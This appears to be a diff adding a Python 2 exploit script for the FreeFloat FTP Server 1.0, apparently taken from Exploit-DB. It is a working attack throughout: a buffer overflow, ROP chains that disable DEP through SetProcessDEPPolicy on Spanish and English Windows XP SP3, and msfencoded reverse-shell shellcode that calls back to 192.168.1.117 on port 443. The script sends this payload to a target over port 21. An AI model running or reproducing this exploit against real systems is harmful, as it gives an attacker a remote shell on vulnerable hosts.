@@ -1,0 +1,92 @@
+#!usr/bin/python
+# Exploit title: FreeFloat ftp 1.0 DEP bypass with ROP 
+#
+# Exploit Author: negux 
+#
+# POC: http://www.exploit-db.com/exploits/24479/
+# Tested on : Windows XP SP 3 Spanish
+import socket,struct
+
+# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.117 LPORT=443 R | msfencode -a x86 -b '\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d'
+
+shellcode = (
+"\x6a\x4f\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb7" +
+"\x2d\xad\xa3\x83\xeb\xfc\xe2\xf4\x4b\xc5\x24\xa3\xb7\x2d" +
+"\xcd\x2a\x52\x1c\x7f\xc7\x3c\x7f\x9d\x28\xe5\x21\x26\xf1" +
+"\xa3\xa6\xdf\x8b\xb8\x9a\xe7\x85\x86\xd2\x9c\x63\x1b\x11" +
+"\xcc\xdf\xb5\x01\x8d\x62\x78\x20\xac\x64\x55\xdd\xff\xf4" +
+"\x3c\x7f\xbd\x28\xf5\x11\xac\x73\x3c\x6d\xd5\x26\x77\x59" +
+"\xe7\xa2\x67\x7d\x26\xeb\xaf\xa6\xf5\x83\xb6\xfe\x4e\x9f" +
+"\xfe\xa6\x99\x28\xb6\xfb\x9c\x5c\x86\xed\x01\x62\x78\x20" +
+"\xac\x64\x8f\xcd\xd8\x57\xb4\x50\x55\x98\xca\x09\xd8\x41" +
+"\xef\xa6\xf5\x87\xb6\xfe\xcb\x28\xbb\x66\x26\xfb\xab\x2c" +
+"\x7e\x28\xb3\xa6\xac\x73\x3e\x69\x89\x87\xec\x76\xcc\xfa" +
+"\xed\x7c\x52\x43\xef\x72\xf7\x28\xa5\xc6\x2b\xfe\xdf\x1e" +
+"\x9f\xa3\xb7\x45\xda\xd0\x85\x72\xf9\xcb\xfb\x5a\x8b\xa4" +
+"\x48\xf8\x15\x33\xb6\x2d\xad\x8a\x73\x79\xfd\xcb\x9e\xad" +
+"\xc6\xa3\x48\xf8\xfd\xf3\xe7\x7d\xed\xf3\xf7\x7d\xc5\x49" +
+"\xb8\xf2\x4d\x5c\x62\xa4\x6a\xcb\x77\x85\xac\xd6\xdf\x2f" +
+"\xad\xa2\x0c\xa4\x4b\xc9\xa7\x7b\xfa\xcb\x2e\x88\xd9\xc2" +
+"\x48\xf8\xc5\xc0\xda\x49\xad\x2a\x54\x7a\xfa\xf4\x86\xdb" +
+"\xc7\xb1\xee\x7b\x4f\x5e\xd1\xea\xe9\x87\x8b\x2c\xac\x2e" +
+"\xf3\x09\xbd\x65\xb7\x69\xf9\xf3\xe1\x7b\xfb\xe5\xe1\x63" +
+"\xfb\xf5\xe4\x7b\xc5\xda\x7b\x12\x2b\x5c\x62\xa4\x4d\xed" +
+"\xe1\x6b\x52\x93\xdf\x25\x2a\xbe\xd7\xd2\x78\x18\x47\x98" +
+"\x0f\xf5\xdf\x8b\x38\x1e\x2a\xd2\x78\x9f\xb1\x51\xa7\x23" +
+"\x4c\xcd\xd8\xa6\x0c\x6a\xbe\xd1\xd8\x47\xad\xf0\x48\xf8" +
+"\xad\xa3")
+
+## ROP 
+
+rop =  struct.pack("<I",0x77bf362c) # POP EBX / RET
+rop += struct.pack("<I",0x41414141) # junk
+rop += struct.pack("<I",0x41414141) # junk
+rop += struct.pack("<I",0xFFFFFFFF) # 00000000
+rop += struct.pack("<I",0x7e810b7e) # INC EBX / RET
+
+rop += struct.pack("<I",0x77bebb36) # POP EBP / RET
+rop += struct.pack("<I",0x7C862144) # SetProcessDEPPolicy
+
+rop += struct.pack("<I",0x77bf3b47) # POP EDI / RET
+rop += struct.pack("<I",0x77be1110) # RET
+rop += struct.pack("<I",0x77bf1891) # POP ESI / RET
+rop += struct.pack("<I",0x77be2091) # RET
+
+rop += struct.pack("<I",0x7e6ea62b) # PUSHAD / RET
+
+####
+
+### Exploit-DB Note ROP for Windows SP3 English SP3
+rop2 =  struct.pack("<I",0x7C9F880B) # POP EBX / RETN 7C9F880B
+rop2 += struct.pack("<I",0x41414141) # junk
+rop2 += struct.pack("<I",0x41414141) # junk
+rop2 += struct.pack("<I",0xFFFFFFFF) # 00000000
+rop2 += struct.pack("<I",0x77540FB2) # INC EBX / RETN 77540FB2
+ 
+rop2 += struct.pack("<I",0x7C9FD315) # POP EBP / RETN 7C9FD315
+rop2 += struct.pack("<I",0x7C862144) # SetProcessDEPPolicy
+ 
+rop2 += struct.pack("<I",0x7C9FCEF2) # POP EDI / RETN 7C9FCEF2
+rop2 += struct.pack("<I",0x7C9FCEF3) # RET 7C9FCEF3
+rop2 += struct.pack("<I",0x7C9F9CA2) # POP ESI / RETN  7C9F9CA2
+rop2 += struct.pack("<I",0x7C9FCEF3) # RETN
+ 
+rop2 += struct.pack("<I",0x7E423AD9) # PUSHAD / RETN 7E423AD9
+###
+
+
+target = "192.168.1.71"
+port = 21
+junk = "\x41"*251
+nops = "\x90"*100
+
+exploit = junk + rop + nops + shellcode
+
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+try:
+	connect = sock.connect((target,port))
+	sock.recv(1024)
+	sock.send(exploit +"\r\n")
+	sock.close()
+except:
+	print "Error to connect... "
